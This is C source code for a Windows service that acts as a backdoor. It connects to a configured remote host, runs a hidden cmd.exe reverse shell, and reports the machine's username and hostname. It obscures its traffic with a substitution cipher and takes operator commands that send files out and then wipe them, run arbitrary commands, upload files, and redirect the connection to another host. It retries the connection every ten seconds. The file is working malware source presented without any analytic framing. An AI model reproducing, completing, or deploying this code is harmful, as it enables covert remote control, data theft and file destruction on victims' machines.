#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <shlwapi.h>
#include "winconsts.h"
#include <time.h>

SERVICE_STATUS g_ServiceStatus = {0};
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE hStdInRead, hStdInWrite;
HANDLE hStdOutRead, hStdOutWrite;
HANDLE hCmdProcess = NULL;
SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
char currentDir[MAX_PATH] = "C:\\";
typedef struct {
    char ip[16];
    int port;
} CONN;
CONN conn = { IP, PORT };
volatile int breakConn = 0;
unsigned char sub_table[256];
unsigned char rev_table[256];

void send_hidden(SOCKET s, char* data, int len) {
    char* obfuscated = (char*)malloc(len);
    if (!obfuscated) return;
    for (int i = 0; i < len; i++) {
        obfuscated[i] = (char)sub_table[(unsigned char)data[i]];
    }
    send(s, obfuscated, len, 0);
    free(obfuscated);
}
void decrypt_incoming(char* data, int len) {
    for (int i = 0; i < len; i++) {
        data[i] = (char)rev_table[(unsigned char)data[i]];
    }
}
DWORD WINAPI OutputThread(LPVOID lpParam) {
    SOCKET s = (SOCKET)lpParam;
    char buffer[4096];
    DWORD bytesRead;
    while (ReadFile(hStdOutRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
        send_hidden(s, buffer, bytesRead);
    }
    return 0;
}

DWORD WINAPI InterceptThread(LPVOID lpParam) {
    SOCKET s = (SOCKET)lpParam;
    char buffer[4096];
    DWORD dwWritten;
    while (1) {
        u_long m = 1;
        ioctlsocket(s, FIONBIO, &m);
        int bytesRecv = recv(s, buffer, sizeof(buffer)-1, 0);
        if (bytesRecv == 0) break;
        if (bytesRecv < 0) {
            int err = WSAGetLastError();
            if (err == WSAEWOULDBLOCK) {
                Sleep(50);
                continue;
            }
            break;
        }
        decrypt_incoming(buffer, bytesRecv);
        buffer[bytesRecv] = '\0';
        if (strncmp(buffer, "0log ", 5) == 0) {
            char target[MAX_PATH];
            strncpy(target, buffer + 5, sizeof(target) - 1);
            target[strcspn(target, "\r\n")] = 0;
            char filePath[MAX_PATH];
            if (PathCombineA(filePath, currentDir, target) == NULL) {
                continue; 
            }
            FILE* file = fopen(filePath, "rb");
            if (file) {
                send_hidden(s, "0FILE_TRANSFER_BOF", 18);
                fseek(file, 0, SEEK_END);
                long fileSize = ftell(file);
                fseek(file, 0, SEEK_SET);
                if (fileSize > 0) {
                    char* fileData = (char*)malloc(fileSize);
                    if (fileData) {
                        fread(fileData, 1, fileSize, file);
                        send_hidden(s, fileData, fileSize);
                        free(fileData);
                    }
                }
                fclose(file);
                FILE* wipe = fopen(filePath, "wb");
                if (wipe) fclose(wipe);
                send_hidden(s, "0FILE_TRANSFER_EOF", 18);
            } else {
                char errMsg[] = "Error: File not found or access denied.\n";
                send_hidden(s, errMsg, strlen(errMsg));
            }
            continue;
        } else if (strncmp(buffer, "cd ", 3) == 0) {
            char target[MAX_PATH];
            strncpy(target, buffer + 3, sizeof(target) - 1);
            target[strcspn(target, "\r\n")] = 0;
            char combined[MAX_PATH];
            char normalized[MAX_PATH];
            if (PathCombineA(combined, currentDir, target) != NULL) {
                 if (GetFullPathNameA(combined, MAX_PATH, normalized, NULL) != 0) {
                    snprintf(currentDir, sizeof(currentDir), "%s", normalized);
                }
            }
        } else if (strncmp(buffer, "0spawn ", 7) == 0) {
            char ip[16];
            int port;
            if (sscanf(buffer + 7, "%s %d", ip, &port) == 2) {
                char ip[16];
                int port;
                if (sscanf(buffer + 7, "%s %d", ip, &port) == 2) {
                    strncpy(conn.ip, ip, 16);
                    conn.port = port;
                    breakConn = 1;
                    break;
                }
            }
            continue;
        } else if (strncmp(buffer, "0exec ", 6) == 0) {
            char* data = buffer + 6; 
            data[strcspn(data, "\r\n")] = 0;
            UINT result = WinExec(data, 0);
            if (result <= 31) {
                char msg[] = "Command Failed.\n";
                send_hidden(s, msg, strlen(msg));
            } else {
                char msg[] = "Command Executed.\n";
                send_hidden(s, msg, strlen(msg));
            }
            continue;
        } else if (strncmp(buffer, "0file ", 6) == 0) {
            DBG("GOT A FILE TRANSFER");
            int fsize;
            sscanf(buffer + 6, "%d", &fsize);
            char *fname_start = strchr(buffer, '\n');
            if (!fname_start) continue;
            fname_start++;
            char *fname_end = strchr(fname_start, '\n');
            if (!fname_end) continue;
            *fname_end = '\0';
            char filename[256];
            strncpy(filename, fname_start, sizeof(filename)-1);
            filename[sizeof(filename)-1] = '\0';
            DBG("Filename parsed");
            char filePath[MAX_PATH + strlen(filename)];
            snprintf(filePath, sizeof(filePath), "%s\\%s", currentDir, filename);
            FILE *f = fopen(filePath, "wb");
            if (!f) {
                send_hidden(s, "0FILE_TRANSFER_E", 16);
                continue;
            }
            char *file_start = fname_end + 1;

            int already_received = bytesRecv - (file_start - buffer);
            if (already_received > 0) {
                fwrite(file_start, 1, already_received, f);
            }
            int total = already_received;
            char recv_buffer[4096];
            while (total < fsize) {
                int bytes = recv(s, recv_buffer, sizeof(recv_buffer), 0);
                if (bytes <= 0) break;
                decrypt_incoming(recv_buffer, bytes);
                fwrite(recv_buffer, 1, bytes, f);
                total += bytes;
            }
            char msg[250];
            snprintf(msg, sizeof(msg), "%s %s", "0FILE_TRANSFER_R", filePath);
            send_hidden(s, msg, strlen(msg));
            fclose(f);
            continue;
        }
        WriteFile(hStdInWrite, buffer, bytesRecv, &dwWritten, NULL);
    }
}
void SpawnReverseShell(char* ip, int port) {
    if (GetCurrentDirectoryA(MAX_PATH, currentDir) == 0) {
        strncpy(currentDir, "C:\\", MAX_PATH);
    }
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    SOCKET s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    SetHandleInformation((HANDLE)s, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);
    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
        CreatePipe(&hStdInRead, &hStdInWrite, &sa, 0);
        CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0);
        SetHandleInformation(hStdInWrite, HANDLE_FLAG_INHERIT, 0);
        SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        si.hStdInput = hStdInRead;
        si.hStdOutput = hStdOutWrite;
        si.hStdError = hStdOutWrite;
        u_long mode = 1;
        ioctlsocket(s, FIONBIO, &mode);
        char hostname[MAX_COMPUTERNAME_LENGTH + 1];
        char username[24];
        DWORD hSize = sizeof(hostname);
        DWORD uSize = sizeof(username);
        GetComputerNameA(hostname, &hSize);
        GetUserNameA(username, &uSize);
        char infoBuf[512];
        snprintf(infoBuf, sizeof(infoBuf), "0info %s&%s\n", username, hostname);
        send(s, infoBuf, strlen(infoBuf), 0);
        for (int i = 0; i < 256; i++) sub_table[i] = (unsigned char)i;
        srand((unsigned int)time(NULL)); 
        for (int i = 255; i > 0; i--) {
            int j = rand() % (i + 1);
            unsigned char temp = sub_table[i];
            sub_table[i] = sub_table[j];
            sub_table[j] = temp;
        }
        send(s, (char*)sub_table, 256, 0);
        for (int i = 0; i < 256; i++) {
            rev_table[sub_table[i]] = (unsigned char)i;
        }
        if (CreateProcessA(NULL, "C:\\Windows\\System32\\cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            HANDLE hInt = CreateThread(NULL, 0, InterceptThread, (LPVOID)s, 0, NULL);
            CreateThread(NULL, 0, OutputThread, (LPVOID)s, 0, NULL);
            while (1) {
                if (WaitForSingleObject(pi.hProcess, 50) == WAIT_OBJECT_0) {
                    break; 
                }
                char temp;
                int res = recv(s, &temp, 1, MSG_PEEK);
                if (res == 0 || (res < 0 && WSAGetLastError() != WSAEWOULDBLOCK)) {
                    TerminateProcess(pi.hProcess, 0); 
                    break; 
                }
                if (breakConn) {
                    TerminateProcess(pi.hProcess, 0);
                    breakConn = 0;
                    break;
                }
            }
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    } else {
        conn = (CONN){ IP, PORT };
    }
    closesocket(s);
    WSACleanup();
}
void WINAPI ServHandle(DWORD code) {
    switch (code) {
        case SERVICE_CONTROL_STOP:
        case SERVICE_CONTROL_SHUTDOWN:
            g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
            SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
            break;
        default:
            break;
    }
}
void WINAPI ServMain(DWORD argc, LPTSTR *argv) {
    g_StatusHandle = RegisterServiceCtrlHandlerA(SERVICE_NAME, ServHandle);
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
    while (g_ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
        SpawnReverseShell(conn.ip, conn.port);
        Sleep(10000);
    }
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    SERVICE_TABLE_ENTRYA ServiceTable[] = {
        {SERVICE_NAME, (LPSERVICE_MAIN_FUNCTIONA)ServMain},
        {NULL, NULL}
    };
    StartServiceCtrlDispatcherA(ServiceTable);
    return 0;
}